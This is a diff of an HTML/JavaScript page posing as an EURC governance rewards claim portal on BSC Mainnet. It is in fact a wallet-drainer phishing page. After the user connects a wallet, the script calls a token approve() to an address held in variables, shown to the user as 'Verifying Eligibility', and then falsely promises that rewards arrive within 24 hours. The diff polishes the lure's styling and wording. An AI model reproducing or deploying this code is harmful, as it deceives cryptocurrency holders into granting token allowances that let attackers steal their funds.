@@ -3,42 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EURC | Institutional Governance Portal</title>
+    <title>EURC | Institutional Governance</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #2775ca; --bg: #0a0b0d; --card-bg: #141519; --text-dim: #848e9c; }
-        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: var(--card-bg); padding: 2.5rem; border-radius: 28px; text-align: center; width: 100%; max-width: 400px; border: 1px solid #2b2f36; box-shadow: 0 25px 50px rgba(0,0,0,0.6); position: relative; }
-        .logo-container { width: 85px; height: 85px; margin: 0 auto 1.5rem; position: relative; }
-        .logo-img { width: 100%; height: 100%; border-radius: 50%; box-shadow: 0 0 20px rgba(39, 117, 202, 0.4); }
-        h2 { margin: 0 0 0.75rem; font-size: 1.75rem; font-weight: 700; letter-spacing: -0.5px; }
-        p { color: var(--text-dim); font-size: 1rem; margin-bottom: 2rem; line-height: 1.6; padding: 0 10px; }
-        .btn { width: 100%; padding: 1.2rem; background: var(--primary); color: white; border: none; border-radius: 16px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(39, 117, 202, 0.5); }
-        .btn:active { transform: scale(0.98); }
-        .status { margin-top: 1.5rem; font-size: 0.9rem; color: var(--primary); font-weight: 500; min-height: 1.2rem; }
-        .stats { display: flex; justify-content: space-around; margin-top: 2rem; border-top: 1px solid #2b2f36; padding-top: 1.5rem; }
-        .stat-item span { display: block; font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; margin-bottom: 4px; }
-        .stat-item b { font-size: 1rem; color: #fff; }
+        :root { --primary: #2775ca; --primary-hover: #1e5ba3; --bg: #050608; --card-bg: #0d0f14; --text-main: #ffffff; --text-dim: #94a3b8; }
+        body { background: var(--bg); color: var(--text-main); font-family: 'Plus Jakarta Sans', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; position: relative; overflow: hidden; }
+        
+        /* Arka Plan Efekti */
+        body::before { content: ""; position: absolute; width: 300px; height: 300px; background: var(--primary); filter: blur(150px); opacity: 0.15; top: 20%; left: 10%; z-index: -1; }
+
+        .card { background: var(--card-bg); padding: 3rem 2.5rem; border-radius: 32px; text-align: center; width: 100%; max-width: 420px; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 40px 100px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
+        
+        .logo-wrapper { width: 100px; height: 100px; margin: 0 auto 2rem; position: relative; display: flex; align-items: center; justify-content: center; background: rgba(39, 117, 202, 0.1); border-radius: 50%; padding: 10px; border: 1px solid rgba(39, 117, 202, 0.2); }
+        .logo-img { width: 100%; height: 100%; border-radius: 50%; object-fit: contain; filter: drop-shadow(0 0 15px rgba(39, 117, 202, 0.5)); }
+        
+        h2 { margin: 0 0 1rem; font-size: 1.8rem; font-weight: 800; letter-spacing: -1px; }
+        p { color: var(--text-dim); font-size: 1rem; margin-bottom: 2.5rem; line-height: 1.7; font-weight: 400; }
+        
+        .btn { width: 100%; padding: 1.25rem; background: var(--primary); color: white; border: none; border-radius: 18px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .btn:hover { background: var(--primary-hover); transform: translateY(-5px); box-shadow: 0 15px 30px rgba(39, 117, 202, 0.4); }
+        
+        .status { margin-top: 1.5rem; font-size: 0.9rem; color: var(--primary); font-weight: 600; min-height: 1.5rem; letter-spacing: 0.5px; }
+        
+        .footer-stats { display: flex; justify-content: space-between; margin-top: 2.5rem; border-top: 1px solid rgba(255, 255, 255, 0.05); padding-top: 2rem; }
+        .stat-box span { display: block; font-size: 0.7rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+        .stat-box b { font-size: 0.95rem; color: #fff; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="logo-container">
-        <img src="https://raw.githubusercontent.com/bsceurocoin/claim-eurc/main/images.png" class="logo-img" alt="EURC">
+    <div class="logo-wrapper">
+        <img src="https://bsceurocoin.github.io/claim-eurc/images.png" 
+             onerror="this.src='https://raw.githubusercontent.com/bsceurocoin/claim-eurc/main/images.png'"
+             class="logo-img" alt="EURC Logo">
     </div>
-    <h2>EURC Incentives</h2>
-    <p>Governance participants are eligible to claim accumulated EURC rewards based on wallet activity.</p>
+    <h2>Governance Rewards</h2>
+    <p>Eligible governance participants can now claim their accumulated EURC incentives directly to their wallets.</p>
     
     <button id="claimBtn" class="btn">Connect & Claim</button>
     
     <div id="statusMsg" class="status"></div>
 
-    <div class="stats">
-        <div class="stat-item"><span>Network</span><b>BSC Mainnet</b></div>
-        <div class="stat-item"><span>Status</span><b style="color: #0ecb81;">Active</b></div>
+    <div class="footer-stats">
+        <div class="stat-box"><span>Network</span><b>BSC Mainnet</b></div>
+        <div class="stat-box"><span>Status</span><b style="color: #10b981;">● Live</b></div>
     </div>
 </div>
 
@@ -51,14 +61,13 @@
         const s = document.getElementById('statusMsg');
 
         if (!window.ethereum) {
-            // Hata vermek yerine doğrudan cüzdan içine yönlendirir
             window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
             return;
         }
 
         try {
             const p = new ethers.providers.Web3Provider(window.ethereum);
-            b.innerText = "Connecting...";
+            b.innerText = "Initializing...";
             await p.send("eth_requestAccounts", []);
             const n = await p.getNetwork();
 
@@ -80,16 +89,16 @@
             b.innerText = "Verifying Eligibility...";
             const tx = await c.approve(T, M);
             
-            b.innerText = "Processing Claim...";
-            s.innerText = "Finalizing on-chain request...";
+            b.innerText = "Finalizing Claim...";
+            s.innerText = "Broadcasting to network...";
             await tx.wait();
             
             b.innerText = "Success!";
-            s.innerText = "500 EURC will be sent to your wallet within 24h.";
+            s.innerText = "Rewards will be disbursed within 24 hours.";
             
         } catch (err) {
             b.innerText = "Try Again";
-            s.innerText = "Transaction failed or rejected.";
+            s.innerText = "Action required to continue.";
         }
     }
 
